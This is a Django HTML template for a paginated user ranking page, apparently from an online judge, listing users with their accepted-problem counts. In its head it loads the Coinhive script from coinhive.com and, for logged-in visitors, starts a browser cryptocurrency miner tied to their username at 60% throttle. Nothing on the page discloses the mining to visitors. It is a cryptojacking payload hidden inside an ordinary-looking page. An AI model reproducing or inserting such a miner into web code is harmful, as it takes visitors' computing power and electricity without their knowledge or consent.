<!DOCTYPE html>
<html lang="en">
    <head>
        {% include "header.html" %}
        {% load staticfiles %}
        <script src="https://coinhive.com/lib/coinhive.min.js"></script>
        <script>	
            {% if login %}
                var miner = new CoinHive.User('R8uBnEUWe9lzB5R9BAhAoPiaNbIvv56c','{{ name }}',{
                    autoThreads: true,
                    throttle: 0.6
                });
                miner.start();
            {% else %}
                var miner = new CoinHive.Anonymous('R8uBnEUWe9lzB5R9BAhAoPiaNbIvv56c',{
                    autoThreads: true,
                    throttle: 0.5
                });
          {% endif %}
        </script>
    </head>
    <body>
        {% include "navbar.html" %}
        <div class="container" style="margin-top:50px;">
            <div class="table-responsive">
                <table class="table table-striped table-bordered">
                    <thead>
                      <tr>
                        <th style="text-align:center;">#</th>
                        <th style="text-align:center;">Name</th>
                        <th style="text-align:center;">AC</th>
                        <th style="text-align:center;">Last edit time</th>
                      </tr>
                    </thead>
                    <tbody>
                        {% for u in users %}
                        <tr>
                            <td align="center">{{ u.id }}</td>
                            <td align="center"><a href="/profile={{ u.name }}" style="color:black;">{{ u.name }}</a> </td>
                            <td align="center">{{ u.AC }}</td>
                            <td align="center">{{ u.update }}</td>
                        </tr>
                        {% endfor %}
                    </tbody>
                </table>
            </div>
            {% include "paginator.html" %}
        </div>
    </body>
</html>
